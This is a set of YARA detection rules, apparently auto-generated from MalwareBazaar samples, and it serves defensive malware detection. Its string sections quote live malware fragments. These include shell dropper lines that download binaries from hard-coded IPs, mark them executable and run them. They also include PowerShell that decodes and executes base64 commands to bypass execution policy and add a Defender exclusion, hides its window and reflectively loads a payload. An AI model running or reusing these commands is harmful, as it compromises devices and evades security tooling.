      $s20 = "lizeInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionbz.WrappedSetupProgrambz.CustomAc" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc {
   meta:
      description = "evidences - file b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "b3a23896df77441fbac8e4f392953d22c0818583ba4da443c6200863ccb204bc"
   strings:
      $x1 = "NameTableTypeColumn_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $x3 = "llowed.ALLUSERS1ARPNOREPAIRARPNOMODIFYARPPRODUCTICON/c start msedge https://www.med.unc.edu/webguide/wp-content/uploads/sites/41" ascii
      $s4 = "entIdGuidA string GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table reco" ascii
      $s5 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide
      $s6 = "GISTRATIONBZ.COMPANYNAMEEXEMSI.COMBZ.BASENAMEinstall.exeBZ.ELEVATE_EXECUTABLEneverBZ.INSTALLMODEEARLYBZ.WRAPPERVERSION11.0.53.0B" ascii
      $s7 = ".UIBASIC_INSTALL_ARGUMENTSBZ.UIREDUCED_INSTALL_ARGUMENTSBZ.UIFULL_INSTALL_ARGUMENTSBZ.FIXED_UNINSTALL_ARGUMENTSManufacturerProdu" ascii
      $s8 = "MsiCustomActions.dll" fullword ascii
      $s9 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s10 = "9/2019/07/AdobePDF.pdfBZ.RUN_BEFORE_INSTALL_PARAMETERScmd.exeNoneBZ.VER2973BZ.CURRENTDIR*SOURCEDIR*BZ.WRAPPED_APPIDBZ.WRAPPED_RE" ascii
      $s11 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii
      $s12 = "Error removing temp executable." fullword wide
      $s13 = "EXPAND.EXE" fullword wide
      $s14 = "amFilesFolderbxjvilw7|[BZ.COMPANYNAME]TARGETDIR.SourceDirProductFeatureMain FeatureProductIconFindRelatedProductsLaunchCondition" ascii
      $s15 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii
      $s16 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s17 = "tionDllbz.ProductComponent{EDE10F6C-30F4-42CA-B5C7-ADB905E45BFC}BZ.INSTALLFOLDERregLogonUserbz.EarlyInstallMain_InstallMain@4bz." ascii
      $s18 = "OS supports elevation" fullword wide
      $s19 = "OS does not support elevation" fullword wide
      $s20 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3 {
   meta:
      description = "evidences - file f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "f22beeedb8ec124d4a903b61665433c414c5249490ec87b37fe5a60beb001cd3"
   strings:
      $x1 = "NameTableTypeColumn_ValidationValueNPropertyId_SummaryInformationDescriptionSetCategoryKeyColumnMaxValueNullableKeyTableMinValue" ascii
      $x2 = "on.AdminUISequenceAdvtExecuteSequenceBinaryUnique key identifying the binary data.DataThe unformatted binary data.ComponentPrima" ascii
      $s3 = "tring GUID unique to this component, version, and language.Directory_DirectoryRequired key of a Directory table record. This is " ascii
      $s4 = " - UNREGISTERED - Wrapped using MSI Wrapper from www.exemsi.com" fullword wide
      $s5 = "NBZ.COMPANYNAMEEXEMSI.COMBZ.BASENAMEinstall.exeBZ.ELEVATE_EXECUTABLEneverBZ.INSTALLMODEEARLYBZ.WRAPPERVERSION11.0.53.0BZ.EXITCOD" ascii
      $s6 = "8C01FF89}ProductLanguage1033ProductNameMicrosoft EdgeProductVersionWIX_DOWNGRADE_DETECTEDWIX_UPGRADE_DETECTEDSecureCustomPropert" ascii
      $s7 = "MsiCustomActions.dll" fullword ascii
      $s8 = "f columnAdminExecuteSequenceActionName of action to invoke, either in the engine or the handler DLL.ConditionOptional expression" ascii
      $s9 = "C:\\ss2\\Projects\\MsiWrapper\\MsiCustomActions\\Release\\MsiCustomActions.pdb" fullword ascii
      $s10 = "Error removing temp executable." fullword wide
      $s11 = "EXPAND.EXE" fullword wide
      $s12 = "amFilesFolderbxjvilw7|[BZ.COMPANYNAME]TARGETDIR.SourceDirProductFeatureMain FeatureProductIconFindRelatedProductsLaunchCondition" ascii
      $s13 = " format.InstallExecuteSequenceInstallUISequenceLaunchConditionExpression which must evaluate to TRUE in order for install to com" ascii
      $s14 = "ry key used to identify a particular component record.ComponentIdGuidA string GUID unique to this component, version, and langua" ascii
      $s15 = "tionDllbz.ProductComponent{EDE10F6C-30F4-42CA-B5C7-ADB905E45BFC}BZ.INSTALLFOLDERregLogonUserbz.EarlyInstallMain_InstallMain@4bz." ascii
      $s16 = "iesWIX_DOWNGRADE_DETECTED;WIX_UPGRADE_DETECTEDSOFTWARE\\[BZ.COMPANYNAME]\\MSI Wrapper\\Installed\\[BZ.WRAPPED_APPID]LogonUser[Lo" ascii
      $s17 = "OS supports elevation" fullword wide
      $s18 = "OS does not support elevation" fullword wide
      $s19 = "ack cabinet order.IconPrimary key. Name of the icon file.Binary stream. The binary icon data in PE (.DLL or .EXE) or icon (.ICO)" ascii
      $s20 = "lizeInstallValidateInstallInitializeInstallAdminPackageInstallFilesInstallFinalizeExecuteActionbz.WrappedSetupProgrambz.CustomAc" ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 6000KB and
      1 of ($x*) and 4 of them
}

rule sig_9f38e1f504a6dfdbe946619e02696c34ec37e4ee9cb992281f05d8bb103246f3 {
   meta:
      description = "evidences - file 9f38e1f504a6dfdbe946619e02696c34ec37e4ee9cb992281f05d8bb103246f3.msi"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "9f38e1f504a6dfdbe946619e02696c34ec37e4ee9cb992281f05d8bb103246f3"
   strings:
      $x1 = "que key identifying the binary data.DataThe unformatted binary data.ComponentPrimary key used to identify a particular component" ascii
      $x2 = "ecKillAteraTaskQuietKillAteraServicesc delete AteraAgentoldVersionUninstallunins000.exe /VERYSILENTinstall/i /IntegratorLogin=\"" ascii
      $x3 = "minPackageInstallFilesInstallFinalizeExecuteActionPublishFeaturesPublishProductNETFRAMEWORK35NetFramework35AlphaControlAgentInst" ascii
      $x4 = "rstrtmgr.dll" fullword wide /* reversed goodware string 'lld.rgmtrtsr' */
      $x5 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\shellexecca.cpp" fullword ascii
      $s6 = "failed to get WixShellExecBinaryId" fullword ascii
      $s7 = "failed to process target from CustomActionData" fullword ascii
      $s8 = "AlphaControlAgentInstallation.dll" fullword wide
      $s9 = "failed to get handle to kernel32.dll" fullword ascii
      $s10 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\serviceconfig.cpp" fullword ascii
      $s11 = "NSTALLFOLDERAteraAgent.exe.config{0EC8B23C-C723-41E1-9105-4B9C2CDAD47A}ICSharpCode.SharpZipLib.dll{F1B1B9D1-F1B0-420C-9D93-F04E9" ascii
      $s12 = "lrpfxg.exe|AteraAgent.exe1.8.7.207uho0yn3.con|AteraAgent.exe.configfd-i8f6f.dll|ICSharpCode.SharpZipLib.dll1.3.3.11e8lrglzz.dll|" ascii
      $s13 = "AteraAgent.exe" fullword ascii
      $s14 = "failed to get WixShellExecTarget" fullword ascii
      $s15 = "failed to get security descriptor's DACL - error code: %d" fullword ascii
      $s16 = "System.ValueTuple.dll" fullword ascii
      $s17 = "DERID]\" /AccountId=\"[ACCOUNTID]\" /AgentId=\"[AGENTID]\"uninstall/uDeleteTaskSchedulerSCHTASKS.EXE /delete /tn \"Monitoring Re" ascii
      $s18 = "The process, %ls, could not be registered with the Restart Manager (probably because the setup is not elevated and the process i" ascii
      $s19 = "c:\\agent\\_work\\66\\s\\src\\ext\\ca\\wixca\\dll\\xmlconfig.cpp" fullword ascii
      $s20 = "c:\\agent\\_work\\66\\s\\src\\libs\\wcautil\\qtexec.cpp" fullword ascii
   condition:
      uint16(0) == 0xcfd0 and filesize < 9000KB and
      1 of ($x*) and 4 of them
}

rule ead60a60220a3549a8ddc6264e667f5ac094eb961b7260a9bd10e8dc2cd07cba {
   meta:
      description = "evidences - file ead60a60220a3549a8ddc6264e667f5ac094eb961b7260a9bd10e8dc2cd07cba.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "ead60a60220a3549a8ddc6264e667f5ac094eb961b7260a9bd10e8dc2cd07cba"
   strings:
      $s1 = "EGUG^>g" fullword ascii
      $s2 = "ff4Bfg" fullword ascii
      $s3 = "pppOec" fullword ascii
      $s4 = "ff4Ifg" fullword ascii
      $s5 = "%s | 3" fullword ascii
      $s6 = "|$Bll$" fullword ascii
      $s7 = "h@$chl" fullword ascii
      $s8 = " !$Q-\\<" fullword ascii
      $s9 = "\"T$fld$" fullword ascii
      $s10 = "\"T$fld" fullword ascii
      $s11 = "\"T$Fld$" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule fa849aa711f1b2d627bc737ceea87cdb8aad257af79975fe3964129a442fe44d {
   meta:
      description = "evidences - file fa849aa711f1b2d627bc737ceea87cdb8aad257af79975fe3964129a442fe44d.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "fa849aa711f1b2d627bc737ceea87cdb8aad257af79975fe3964129a442fe44d"
   strings:
      $s1 = "EGUG^>g" fullword ascii
      $s2 = "ff4Bfg" fullword ascii
      $s3 = "pppOec" fullword ascii
      $s4 = "ff4Ifg" fullword ascii
      $s5 = "t $ctL" fullword ascii
      $s6 = "P&fx@$" fullword ascii
      $s7 = "\"T$fxD$" fullword ascii
      $s8 = "d$BxL$" fullword ascii
      $s9 = " &Fx@$" fullword ascii
      $s10 = "\"T$fxD" fullword ascii
      $s11 = " !$Q5l<" fullword ascii
      $s12 = "\"T$FxD$" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 300KB and
      8 of them
}

rule sig_2ec1c491db61f9f003ea2d8b9c01773a298ec4f46eb838b2ef277b02d16d9ba7 {
   meta:
      description = "evidences - file 2ec1c491db61f9f003ea2d8b9c01773a298ec4f46eb838b2ef277b02d16d9ba7.zip"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "2ec1c491db61f9f003ea2d8b9c01773a298ec4f46eb838b2ef277b02d16d9ba7"
   strings:
      $s1 = "ChromeHistoryView.exe" fullword ascii
      $s2 = "readme.txtPK" fullword ascii
      $s3 = "ChromeHistoryView.exePK" fullword ascii
      $s4 = "ChromeHistoryView.chm" fullword ascii
      $s5 = "ChromeHistoryView.chmPK" fullword ascii
      $s6 = "=8- WQ" fullword ascii
      $s7 = "sOjrlt0" fullword ascii
      $s8 = "KJJIIK7" fullword ascii
      $s9 = "ZMYw/h@" fullword ascii
      $s10 = "0(RNbx?" fullword ascii
      $s11 = " dQqR'!3" fullword ascii
      $s12 = "XEWxp.N" fullword ascii
      $s13 = "2TAmKn[:" fullword ascii
      $s14 = "rs[avHa1SF" fullword ascii
      $s15 = "VlCHF $" fullword ascii
      $s16 = "Q\\BRJZFVN^A" fullword ascii
      $s17 = "qdLn6+;" fullword ascii
      $s18 = "5yscFj;j" fullword ascii
      $s19 = "ncfeiM\"" fullword ascii
      $s20 = "mIec{Rn" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 700KB and
      8 of them
}

rule sig_2f284d4d103367df7f118854da82b3ad3d3ef759fca1e1f5a149bf27066bcac1 {
   meta:
      description = "evidences - file 2f284d4d103367df7f118854da82b3ad3d3ef759fca1e1f5a149bf27066bcac1.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "2f284d4d103367df7f118854da82b3ad3d3ef759fca1e1f5a149bf27066bcac1"
   strings:
      $s1 = "$decodedExclusion = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encExclusion))" fullword ascii
      $s2 = "$decodedPolicy = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encPolicy))" fullword ascii
      $s3 = "$decodedAdminCheck = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($encAdminCheck))" fullword ascii
      $s4 = "    [DllImport(\"user32.dll\")]" fullword ascii
      $s5 = "Invoke-Expression $decodedPolicy" fullword ascii
      $s6 = "Invoke-Expression $decodedAdminCheck" fullword ascii
      $s7 = "Invoke-Expression $decodedExclusion" fullword ascii
      $s8 = "    [DllImport(\"kernel32.dll\")]" fullword ascii
      $s9 = "dpbmRvd3NJZGVudGl0eV0pLjpHZXRDdXJyZW50KCkpKS5Jc0luUn9sZShbU2VjdXJpdHkuUHJpbmljaXBhbC5XaW5kb3dzQnVpbHRpblJvbGUpOjpBZG1pbmlzdHJhdG" ascii
      $s10 = "$h = [C]::GetConsoleWindow()" fullword ascii
      $s11 = "9yKSkpIHsKICAgIFN0YXJ0LVByb2Nlc3MgcG93ZXJzaGVsbC5leGVjdXRpb24uQnlwYXNzIC1Tb2NwZWNlIC1GaWxlICJcJyIgKyAkTXlJbnZvY2F0aW9uLk15Q29tbW" ascii
      $s12 = "    public static extern IntPtr GetConsoleWindow();" fullword ascii
      $s13 = "    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);" fullword ascii
      $s14 = "$encPolicy = \"U2V0LUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNl\"" fullword ascii
      $s15 = "Add-Type $cls" fullword ascii
      $s16 = "[C]::ShowWindow($h, 0)" fullword ascii
      $s17 = "public class C {" fullword ascii
      $s18 = "$cls = @\"" fullword ascii
      $s19 = "$encExclusion = \"QWRkLU1wUHJlZmVyZW5jZSAtRXhjbHVzaW9uUGF0aCAiQzpcLyI=\"" fullword ascii
      $s20 = "$encAdminCheck = \"SWYgKFxOb3QgKCgoTmV3LU9iamVjdCBTZWN1cml0eS5QcmluaWNpcGFsLldpbmRvd3NCcmluaWNpcGFsKFtzZWN1cml0eS5QcmluaWNpcGFsL" ascii
   condition:
      uint16(0) == 0xbbef and filesize < 4KB and
      8 of them
}

rule sig_3e376b0722ed209898a1b3a93a6988c4ad2f6e35083c07dc9e486e3da55c88ed {
   meta:
      description = "evidences - file 3e376b0722ed209898a1b3a93a6988c4ad2f6e35083c07dc9e486e3da55c88ed.ps1"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "3e376b0722ed209898a1b3a93a6988c4ad2f6e35083c07dc9e486e3da55c88ed"
   strings:
      $x1 = "$iy=\"p4AAEAAAAEAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAeAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNh" ascii
      $x2 = "$OE=\"qQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNh" ascii
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s5 = "pI+yD4MPz4/Vz9oP4o/lj+kP7A/+T8AkAIAlAAAAB4wKjDUMPIwEDEpMfgxPjJuMnoygjLaMuQy/TKuM9czCjQTNCQ0NTRfNHM0fzSPNJg07jRiNWc1iTWPNZ01zzXdN" ascii
      $s6 = "///Ax88KGQAAAYlJhMEAxEEHzRYKGQAAAYlJhMFIP8zND846Pr//yhjAAAGJSZ6ERYgCksrDlogDQef+2E4zfr//yCzAAAAKMAAAAYlJhMGERYgcSnBu1ogetFfDmE4r" ascii
      $s7 = "jVmYzRhMzhmYTY4AGMyYWJhZmMwN2E4ZmM3OGE1NDkzZDllNGZmM2ZkMDA1YwBjMmJmM2YwM2Y4NTlmY2YzMmZlMmM5OTJiMTkzYjU2YzkAYzJjMGE4ODNmMDY1MDEwM" ascii
      $s8 = "AEPhdoAAADrAIpEJByIRCRQxgQkbMZEJAFjxkQkAp/GRCQDiTHAg/gED4OpAAAAD7YUBInGgcYXJV6DifEx0b/o2qF8KccJz4P3/9HnifmD8f+J9SHNuejaoXwpwSHPK" ascii
      $s9 = "[Reflection.Assembly]::Load($hgh2).GetType('GOOD').GetMethod('Execute').Invoke($null,$YOO)" fullword ascii
      $s10 = "Q+3RF8CMeiJxvfWIdaJxSHND6/uicYh1gnQD6/Gi3QkCAHog8MCOd51uIPEEF5fW13DVVNXVoPsPIpEJCiIRCQsxkQkJOPGRCQl6MZEJCbpxkQkJ+4xwIP4BHMgikwEJ" ascii
      $s11 = "JCQiBZGD7YQQITSdfXrA4tNCMYGAP90JBj/dCQYU+g/6/7/id+Jw6EYeUQAiw0geUQAicqB4oxGrvcB0inKAdAFdLlRiP/gV+il3v7/g8QEi0QkFDHJhcAPlMGLDI0se" ascii
      $s12 = "CyIZCQticHB6RCITCQuwegYiEQkL41EJBxqFlBV/3QkHP92RP9WPIPEFIP4FnUYgwYWg1YEAMdGFAMAAAC4AQAAAOkm/f//x0YcEwAAADHA6Rj9///MzMzMzMzMzMzMz" ascii
      $s13 = "ACIpCSBAAAAjUQkZGoeUFf/dCQMiXwkFIt9CP93RP9XPIPEFIP4Hg+FogEAAIsMJIPBHotEJASD0ABT/3UMiUQkDFCJTCQMUf93RP9XPIPEFDnYD4VpAQAAARwkg1QkB" ascii
      $s14 = "IX2dFKLnCQYEAAAkJCQkJCQkIn1gf4AEAAAcgW9ABAAAFWNRCQIUFNXi0QkEP9wRP9QPIPEFDnodRAB74PTACnudc+4AQAAAOsMiwQkx0AcEwAAADHAgcQEEAAAXl9bX" ascii
      $s15 = "$YOO=[object[]] ('CZOS:\\WinZOSdows\\MicrZOSosoft.NEZOST\\FraZOSmework\\v4ZOS.0.30ZOS319\\ReZOSgSvZOScs.exe'.replace('ZOS',''),$" ascii
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                               ' */
      $s17 = "AAAAAAAADA" ascii /* reversed goodware string 'ADAAAAAAAA' */
      $s18 = "AAAAAAAAAB" ascii /* base64 encoded string '       ' */
      $s19 = "AAAAAAAAAAAAAB" ascii /* base64 encoded string '          ' */
      $s20 = "AAAAAEAAAABAAAAA" ascii /* base64 encoded string '    @   @   ' */
   condition:
      uint16(0) == 0x0a0d and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_4397c5383cf14b92532bba942d5c7aa8ac76de244c071309aca347aed1e2b271 {
   meta:
      description = "evidences - file 4397c5383cf14b92532bba942d5c7aa8ac76de244c071309aca347aed1e2b271.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "4397c5383cf14b92532bba942d5c7aa8ac76de244c071309aca347aed1e2b271"
   strings:
      $s1 = "ping -c 2 google.com >/dev/null 2>&1" fullword ascii
      $s2 = "wget -q -Og_ \"http://g.gsm2.net/x/$N\" >/dev/null 2>&1 || OK=0" fullword ascii
      $s3 = "[ -f /bin/adduser ] && N=gc16" fullword ascii
      $s4 = "[ \"${@dns}\" = \"78.47.137.57\" ] && echo 78.47.137.57 g.gsm2.net >> etc/hosts" fullword ascii
      $s5 = "[ -f /usr/bin/smb_scheduler -a -f /lib/libuClibc-0.9.29.so ] && N=gc32" fullword ascii
      $s6 = "[ -f u ] && /bin/sh u </dev/null >/dev/null && rm u" fullword ascii
      $s7 = "[ -f /lib/libuClibc-0.9.31.so ] && N=gc32" fullword ascii
      $s8 = "[ -f u ] && exit 0" fullword ascii
      $s9 = "[ \"$OK\" = \"0\" ] && echo DLFAIL" fullword ascii
      $s10 = "[ -f g_ ] || exit 1" fullword ascii
      $s11 = "# (q) 2012-2024 /sisoft" fullword ascii
      $s12 = "cd /tmp" fullword ascii
      $s13 = "killall gc" fullword ascii
      $s14 = "dd if=g_ of=gc bs=16 skip=1 2>/dev/null" fullword ascii
      $s15 = "echo GI2" fullword ascii
      $s16 = "./gc $1 </dev/null >/dev/null 2>&1" fullword ascii
      $s17 = "[ \"$OK\" = \"0\" ] && exit 1" fullword ascii
      $s18 = "echo GI0" fullword ascii
      $s19 = "chmod 0777 gc" fullword ascii
      $s20 = "echo GI3" fullword ascii
   condition:
      uint16(0) == 0x2123 and filesize < 2KB and
      8 of them
}

rule ce780982e13b5509258f53c1bbe8c12fe6d2eb9491ca1a582496e4ca7e0a977f {
   meta:
      description = "evidences - file ce780982e13b5509258f53c1bbe8c12fe6d2eb9491ca1a582496e4ca7e0a977f.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "ce780982e13b5509258f53c1bbe8c12fe6d2eb9491ca1a582496e4ca7e0a977f"
   strings:
      $s1 = "%s | 3" fullword ascii
   condition:
      uint16(0) == 0x457f and filesize < 200KB and
      all of them
}

rule ca15504587524739d890d2410fb64a336cef4d393a725373a169b87bfdc25928 {
   meta:
      description = "evidences - file ca15504587524739d890d2410fb64a336cef4d393a725373a169b87bfdc25928.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "ca15504587524739d890d2410fb64a336cef4d393a725373a169b87bfdc25928"
   strings:
      $s1 = "(wget http://103.188.82.218/x/arm -O- || busybox wget http://103.188.82.218/x/arm -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s2 = "(wget http://103.188.82.218/x/arm6 -O- || busybox wget http://103.188.82.218/x/arm6 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s3 = "(wget http://103.188.82.218/x/arm -O- || busybox wget http://103.188.82.218/x/arm -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ; r" ascii
      $s4 = "(wget http://103.188.82.218/x/arm6 -O- || busybox wget http://103.188.82.218/x/arm6 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s5 = "(wget http://103.188.82.218/x/arm5 -O- || busybox wget http://103.188.82.218/x/arm5 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s6 = "(wget http://103.188.82.218/x/arm7 -O- || busybox wget http://103.188.82.218/x/arm7 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s7 = "(wget http://103.188.82.218/x/arm5 -O- || busybox wget http://103.188.82.218/x/arm5 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s8 = "(wget http://103.188.82.218/x/arm7 -O- || busybox wget http://103.188.82.218/x/arm7 -O-) > .f; chmod 777 .f; ./.f xvr; > .f; # ;" ascii
      $s9 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s10 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s11 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s12 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s13 = ">/home/.a && cd /home;" fullword ascii
      $s14 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s15 = ">/var/.a && cd /var;" fullword ascii
      $s16 = ">/dev/.a && cd /dev;" fullword ascii
      $s17 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
      $s18 = "m -rf .f;" fullword ascii
      $s19 = " rm -rf .f;" fullword ascii
   condition:
      uint16(0) == 0x2f3e and filesize < 2KB and
      8 of them
}

rule e077e410d1758f5eb656025e19d75a63515046a3e93d84edfaffb367b5578228 {
   meta:
      description = "evidences - file e077e410d1758f5eb656025e19d75a63515046a3e93d84edfaffb367b5578228.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-12"
      hash1 = "e077e410d1758f5eb656025e19d75a63515046a3e93d84edfaffb367b5578228"
   strings:
      $s1 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://83.222.191.91/oops/Kloki.spc ; chmod 777 Kl" ascii
      $s2 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://83.222.191.91/oops/Kloki.ppc ; chmod 777 Kl" ascii
      $s3 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; /bin/busybox wget http://83.222.191.91/oops/Kloki.ppc ; chmod 777 Kl" ascii
      $s4 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; /bin/busybox wget http://83.222.191.91/oops/Kloki.spc ; chmod 777 Kl" ascii
      $s5 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://83.222.191.91/oops/Kloki.mips ; chmod 777 " ascii
      $s6 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.x86_64 ; chmod " ascii
      $s7 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://83.222.191.91/oops/Kloki.mpsl ; chmod 777 " ascii
      $s8 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86_64 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.x86_64 ; chmod " ascii
      $s9 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.x86 ; chmod 777 Kl" ascii
      $s10 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf x86 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.x86 ; chmod 777 Kl" ascii
      $s11 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm6 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.arm6 ; chmod 777 " ascii
      $s12 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://83.222.191.91/oops/Kloki.m68k ; chmod 777 " ascii
      $s13 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mpsl ; /bin/busybox wget http://83.222.191.91/oops/Kloki.mpsl ; chmod 777 " ascii
      $s14 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm7 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.arm7 ; chmod 777 " ascii
      $s15 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf mips ; /bin/busybox wget http://83.222.191.91/oops/Kloki.mips ; chmod 777 " ascii
      $s16 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf m68k ; /bin/busybox wget http://83.222.191.91/oops/Kloki.m68k ; chmod 777 " ascii
      $s17 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm5 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.arm4 ; chmod 777 " ascii
      $s18 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf arm4 ; /bin/busybox wget http://83.222.191.91/oops/Kloki.arm5 ; chmod 777 " ascii
      $s19 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf ppc ; curl http://83.222.191.90/oops/Kloki.ppc ; chmod 777 Kloki.ppc ; ./K" ascii
      $s20 = "cd /tmp || cd /dev || cd /var/tmp || cd /usr ; rm -rf spc ; curl http://83.222.191.90/oops/Kloki.spc ; chmod 777 Kloki.spc ; ./K" ascii
   condition:
      uint16(0) == 0x6463 and filesize < 20KB and
      8 of them
}

